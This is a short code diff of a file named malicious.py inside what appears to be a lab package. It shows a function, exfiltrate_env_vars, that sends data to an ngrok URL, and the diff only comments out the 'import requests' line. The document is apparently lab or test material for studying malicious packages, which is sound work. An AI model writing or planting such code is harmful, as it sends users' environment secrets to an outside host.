@@ -1,5 +1,5 @@
 # artifact_lab_3_package_2b6a4744/malicious.py
-import requests
+# import requests
 
 def exfiltrate_env_vars():
     url = "https://a7de-67-205-141-215.ngrok-free.app/log"  # Substitua pelo seu URL ngrok
@@ -10,4 +10,3 @@ def exfiltrate_env_vars():
         print(f"Server responded with status code: {response.status_code}")
     except Exception as e:
         print(f"Failed to send GET request: {e}")
-
